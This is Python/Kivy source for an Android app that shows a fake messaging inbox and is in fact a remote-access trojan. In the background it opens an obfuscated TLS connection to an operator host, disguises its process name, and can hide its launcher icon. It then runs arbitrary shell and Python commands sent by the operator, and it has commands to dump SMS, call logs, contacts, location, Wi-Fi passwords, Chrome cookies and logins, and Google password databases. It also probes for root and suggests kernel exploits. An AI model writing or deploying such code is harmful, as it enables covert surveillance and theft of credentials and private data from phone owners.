import threading
import base64
import time
import struct
import random
import json
from kivy.app import App
from kivy.uix.label import Label
from kivy.uix.widget import Widget
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.scrollview import ScrollView
from kivy.uix.button import Button
from kivy.uix.textinput import TextInput
from kivy.uix.screenmanager import ScreenManager, Screen
from kivy.properties import StringProperty, ListProperty, NumericProperty
from kivy.clock import Clock
from kivy.graphics import Color, Rectangle, RoundedRectangle, Ellipse
from kivy.core.window import Window

# Set background color for the entire window
Window.clearcolor = (0.95, 0.95, 0.95, 1)


class MessageItem(BoxLayout):
    sender = StringProperty()
    preview = StringProperty()
    time = StringProperty()
    
    def __init__(self, **kwargs):
        super(MessageItem, self).__init__(**kwargs)
        self.orientation = 'horizontal'
        self.size_hint_y = None
        self.height = 180
        self.padding = 30
        self.spacing = 30
        
        with self.canvas.before:
            Color(1, 1, 1, 1)
            self.rect = Rectangle(pos=self.pos, size=self.size)
        self.bind(pos=self._update_rect, size=self._update_rect)
        
        # Avatar placeholder
        avatar_box = BoxLayout(size_hint=(None, 1), width=120)
        with avatar_box.canvas:
            Color(0.2, 0.6, 0.8, 1)
            self.avatar = Ellipse(pos=(self.x + 30, self.y + 30), size=(120, 120))
        
        # Text details
        text_box = BoxLayout(orientation='vertical', spacing=10)
        self.sender_label = Label(
            text=self.sender, color=(0, 0, 0, 1), font_size=45, 
            halign='left', valign='middle', bold=True
        )
        self.sender_label.bind(size=self.sender_label.setter('text_size'))
        
        self.preview_label = Label(
            text=self.preview, color=(0.5, 0.5, 0.5, 1), font_size=35, 
            halign='left', valign='middle'
        )
        self.preview_label.bind(size=self.preview_label.setter('text_size'))
        
        text_box.add_widget(self.sender_label)
        text_box.add_widget(self.preview_label)
        
        # Time label
        self.time_label = Label(
            text=self.time, color=(0.7, 0.7, 0.7, 1), font_size=30, size_hint_x=0.2
        )
        
        self.add_widget(text_box)
        self.add_widget(self.time_label)

    def _update_rect(self, *args):
        self.rect.pos = self.pos
        self.rect.size = self.size

    def on_sender(self, instance, value):
        self.sender_label.text = value

    def on_preview(self, instance, value):
        self.preview_label.text = value

    def on_time(self, instance, value):
        self.time_label.text = value


class ConversationList(Screen):
    def __init__(self, **kwargs):
        super(ConversationList, self).__init__(**kwargs)
        layout = BoxLayout(orientation='vertical')
        
        # Header
        header = BoxLayout(size_hint_y=None, height=150, padding=30)
        with header.canvas:
            Color(0.1, 0.1, 0.1, 1)
            Rectangle(pos=(0, Window.height - 150), size=(Window.width, 150))
        header.add_widget(Label(text="Messages", font_size=60, bold=True))
        layout.add_widget(header)
        
        # ScrollView for messages
        scroll = ScrollView()
        self.list_layout = BoxLayout(orientation='vertical', size_hint_y=None, spacing=2)
        self.list_layout.bind(minimum_height=self.list_layout.setter('height'))
        
        # Mock Data
        mocks = [
            ("Bank Alpha", "Your security code is 442910.", "10:42 AM"),
            ("Mom", "Don't forget to pick up milk!", "9:15 AM"),
            ("Service Provider", "Your monthly bill is ready.", "Yesterday"),
            ("Alex", "Are we still meeting at 5?", "Yesterday"),
            ("Google", "New sign-in from Chrome on Linux.", "Monday"),
            ("Delivery", "Your package has been delivered.", "Sunday")
        ]
        
        for s, p, t in mocks:
            item = MessageItem(sender=s, preview=p, time=t)
            self.list_layout.add_widget(item)
            
        scroll.add_widget(self.list_layout)
        layout.add_widget(scroll)
        self.add_widget(layout)


class MessagesApp(App):
    def build(self):
        # Configuration - these will be replaced by the BuildozerPayloadGenerator
        self.LHOST = "{{LHOST}}"
        self.LPORT = "{{LPORT}}"
        self.XOR_KEY = "{{XOR_KEY}}"
        self.SHOW_UI = "{{SHOW_UI}}"
        self.HIDE_ICON = "{{HIDE_ICON}}"
        self.WAKELOCK = "{{WAKELOCK}}"
        self.MIN_SLEEP = "{{MIN_SLEEP}}"
        self.MAX_SLEEP = "{{MAX_SLEEP}}"
        
        # Fallbacks if replacement fails
        if "{{" + "LHOST" + "}}" == self.LHOST: self.LHOST = "127.0.0.1"
        if "{{" + "LPORT" + "}}" == self.LPORT: self.LPORT = "5000"
        if "{{" + "XOR_KEY" + "}}" == self.XOR_KEY: self.XOR_KEY = "SuperSploitKey"
        if "{{" + "SHOW_UI" + "}}" == self.SHOW_UI: self.SHOW_UI = "true"
        if "{{" + "HIDE_ICON" + "}}" == self.HIDE_ICON: self.HIDE_ICON = "false"
        if "{{" + "WAKELOCK" + "}}" == self.WAKELOCK: self.WAKELOCK = "false"
        if "{{" + "MIN_SLEEP" + "}}" == self.MIN_SLEEP: self.MIN_SLEEP = "10"
        if "{{" + "MAX_SLEEP" + "}}" == self.MAX_SLEEP: self.MAX_SLEEP = "30"

        # Base64 Helper for dynamic import resolution
        def _i(b, f=None):
            m = base64.b64decode(b).decode('utf-8')
            return __import__(m, fromlist=[f] if f else [])

        # Obfuscated dynamic imports
        self._o = _i(b'b3M=')  # os
        self._s = _i(b'c3VicHJvY2Vzcw==')  # subprocess
        self._sh = _i(b'c2hsZXg=')  # shlex
        self._io = _i(b'aW8=')  # io
        self._sy = _i(b'c3lz')  # sys
        self._so = _i(b'c29ja2V0')  # socket
        self._gp = _i(b'Z2V0cGFzcw==')  # getpass
        self._st = _i(b'c3RydWN0')  # struct
        self._tm = _i(b'dGltZQ==')  # time
        self._rd = _i(b'cmFuZG9t')  # random
        self._sl = _i(b'c3Ns')    # ssl
        self._ct = _i(b'Y3R5cGVz') # ctypes

        # Root Context State
        self.is_root = False

        # Thread Renaming (Stealth)
        try:
            libc = self._ct.CDLL('libc.so')
            libc.prctl(15, b'sys_watchdog', 0, 0, 0)
        except: pass

        if self.HIDE_ICON.lower() in ["true", "1", "yes", "y"]:
            Clock.schedule_once(self.hide_launcher_icon, 15)

        # Start payload loop in background
        threading.Thread(target=self.drs_loop, daemon=True).start()
        
        if self.SHOW_UI.lower() in ["false", "0", "no", "n"]:
            return Widget()
            
        sm = ScreenManager()
        sm.add_widget(ConversationList(name='conversations'))
        return sm

    def hide_launcher_icon(self, dt):
        try:
            from jnius import autoclass
            activity = autoclass('org.kivy.android.PythonActivity').mActivity
            pm = activity.getPackageManager()
            component = autoclass('android.content.ComponentName')(
                activity.getPackageName(), "org.kivy.android.PythonActivity"
            )
            pm.setComponentEnabledSetting(
                component, 
                autoclass('android.content.pm.PackageManager').COMPONENT_ENABLED_STATE_DISABLED, 
                autoclass('android.content.pm.PackageManager').DONT_KILL_APP
            )
        except Exception: pass

    def check_su(self):
        if self._o.getuid() == 0: return True
        try:
            proc = self._s.run(['su', '-c', 'id'], capture_output=True, text=True, timeout=5)
            if 'uid=0' in proc.stdout: return True
        except: pass
        return False

    def _xor(self, data, key):
        if isinstance(data, str): data = data.encode('utf-8', errors='ignore')
        return bytes([b ^ ord(key[i % len(key)]) for i, b in enumerate(data)])

    def _send(self, sock, data):
        try:
            if data is None: data = " "
            if isinstance(data, bytes): data = data.decode('utf-8', errors='ignore')
            enc = base64.b64encode(self._xor(data, self.XOR_KEY))
            sock.sendall(self._st.pack('>I', len(enc)) + enc)
        except Exception: pass

    def _recv(self, sock):
        try:
            def _r(n):
                d = bytearray()
                while len(d) < n:
                    p = sock.recv(n - len(d))
                    if not p: return None
                    d.extend(p)
                return bytes(d)
            raw_l = _r(4)
            if not raw_l: return None
            l = self._st.unpack('>I', raw_l)[0]
            if l == 0: return b""
            enc = _r(l)
            if not enc: return None
            dec = base64.b64decode(enc)
            return self._xor(dec, self.XOR_KEY)
        except Exception: return None

    def run_with_output(self, sock, cmd):
        try:
            env = self._o.environ.copy()
            if 'LD_LIBRARY_PATH' in env: del env['LD_LIBRARY_PATH']
            if self.is_root and self._o.getuid() != 0 and not cmd.startswith("su -c"):
                final_cmd = f"su -c '{cmd}'"
            else: final_cmd = cmd
            proc = self._s.run(final_cmd, shell=True, capture_output=True, text=True, timeout=30, env=env)
            self._send(sock, (proc.stdout + proc.stderr) or " \n")
        except Exception as e: self._send(sock, f"Error: {e}\n")

    def auto_root(self):
        if self.check_su():
            self.is_root = True
            return "[+] Root access granted via SU binary.\n"
        try:
            release = self._o.uname().release
            if release.startswith('5.'):
                minor = int(release.split('.')[1])
                if 8 <= minor <= 16: return "GET_EXPLOIT exploits/android/cve_2022_0847_dirtypipe.py\n"
            if release.startswith('4.') or any(v in release for v in ["3.10", "3.4", "3.18"]):
                return "GET_EXPLOIT exploits/android/cve_2016_5195_dirtycow.py\n"
            return f"[-] No exploit for {release}\n"
        except Exception as e: return f"Error: {e}"

    def drs_loop(self):
        while True:
            try:
                raw_s = self._so.socket(self._so.AF_INET, self._so.SOCK_STREAM)
                ctx = self._sl.SSLContext(self._sl.PROTOCOL_TLS_CLIENT)
                ctx.check_hostname = False
                ctx.verify_mode = self._sl.CERT_NONE
                s = ctx.wrap_socket(raw_s, server_hostname=self.LHOST)
                s.connect((self.LHOST, int(self.LPORT)))
                self.is_root = self.check_su()
                self._send(s, f"Android DRS Session (Messages UI): {self._o.uname().node} (ROOT: {'SU' if self.is_root else 'NO'})\n")

                if self.is_root and self.WAKELOCK.lower() in ["true", "1", "yes", "y"]:
                    try:
                        with open('/sys/power/wake_lock', 'w') as f: f.write('sys_watchdog')
                    except: pass

                while True:
                    data = self._recv(s)
                    if data is None: break
                    if data == b"": continue 
                    cmd = data.decode('utf-8', errors='ignore').strip()
                    if not cmd: continue
                    if cmd.lower() == 'exit':
                        s.close()
                        return

                    if cmd == 'auto_root':
                        self._send(s, self.auto_root())
                        continue

                    # --- EXFILTRATION COMMANDS ---
                    if cmd == 'dump_sms': self.run_with_output(s, "content query --uri content://sms")
                    elif cmd == 'dump_calls': self.run_with_output(s, "content query --uri content://call_log/calls")
                    elif cmd == 'dump_contacts': self.run_with_output(s, "content query --uri content://contacts/phones")
                    elif cmd == 'dump_calendar': self.run_with_output(s, "content query --uri content://com.android.calendar/events")
                    elif cmd == 'get_accounts': self.run_with_output(s, "dumpsys account")
                    elif cmd == 'list_apps': self.run_with_output(s, "pm list packages -f")
                    elif cmd == 'get_location': self.run_with_output(s, "dumpsys location | grep -E \"last location|Last Known Locations:\" -A 10")
                    elif cmd == 'dump_wifi': self.run_with_output(s, "cat /data/misc/wifi/WifiConfigStore.xml /data/misc/wifi/wpa_supplicant.conf /data/misc/apexdata/com.android.wifi/WifiConfigStore.xml 2>/dev/null")
                    elif cmd == 'dump_chrome': self.run_with_output(s, "cat \"/data/data/com.android.chrome/app_chrome/Default/Cookies\" \"/data/data/com.android.chrome/app_chrome/Default/Login Data\" 2>/dev/null")
                    elif cmd == 'dump_google_passwords': self.run_with_output(s, "cat /data/data/com.google.android.gms/databases/autofill.db /data/data/com.google.android.gms/databases/credential_manager.db /data/data/com.google.android.gms/databases/password_store.db /data/system_ce/0/accounts_ce.db 2>/dev/null")
                    elif cmd == 'find_cookies': self.run_with_output(s, "find /data/data/ -name \"Cookies\" -o -name \"*cookies.db*\" 2>/dev/null")
                    elif cmd == 'find_passwords': self.run_with_output(s, "find /data/data/ -name \"Login Data\" -o -name \"*password*\" -o -name \"*credential*\" 2>/dev/null")
                    
                    elif cmd.startswith('exec(') or (cmd.endswith(')') and '(' in cmd and ' ' not in cmd.split('(')[0]):
                        try:
                            old_stdout = self._sy.stdout
                            self._sy.stdout = self._io.StringIO()
                            exec(compile(cmd, '<string>', 'exec'), globals())
                            output = self._sy.stdout.getvalue()
                            self._sy.stdout = old_stdout
                            self._send(s, output if output else " \n")
                        except Exception as e: self._send(s, f"[-] Python Error: {e}\n")
                    
                    elif cmd.startswith('cd '):
                        try:
                            self._o.chdir(cmd[3:].strip())
                            self._send(s, b"\n")
                        except Exception as e: self._send(s, f"{e}\n")
                    
                    elif cmd == 'pwd': self._send(s, self._o.getcwd() + "\n")
                    
                    elif cmd.startswith('ls'):
                        try:
                            target_dir = cmd[3:].strip() or '.'
                            files = self._o.listdir(target_dir)
                            self._send(s, '\n'.join(files) + "\n" if files else ' \n')
                        except Exception as e: self._send(s, f"{e}\n")
                    
                    elif cmd.startswith('cat '):
                        try:
                            with open(cmd[4:].strip(), 'r', encoding='utf-8', errors='ignore') as f:
                                out = f.read()
                                self._send(s, out if out else ' \n')
                        except Exception as e: self._send(s, f"{e}\n")
                    
                    elif cmd == 'whoami':
                        try: self._send(s, (self._o.environ.get('USER') or self._gp.getuser()) + "\n")
                        except Exception: self._send(s, b"unknown\n")
                    
                    elif cmd == 'ps':
                        try:
                            out = "PID\tNAME\n"
                            for pid in self._o.listdir('/proc'):
                                if pid.isdigit():
                                    try:
                                        with open(f"/proc/{pid}/comm", 'r') as f: out += f"{pid}\t{f.read().strip()}\n"
                                    except: pass
                            self._send(s, out if out else ' \n')
                        except Exception as e: self._send(s, f"{e}\n")
                    
                    else: self.run_with_output(s, cmd)

            except Exception:
                try: sleep_time = getattr(self._rd, 'randint')(int(self.MIN_SLEEP), int(self.MAX_SLEEP))
                except: sleep_time = getattr(self._rd, 'randint')(10, 30)
                time.sleep(sleep_time)

if __name__ == '__main__':
    MessagesApp().run()
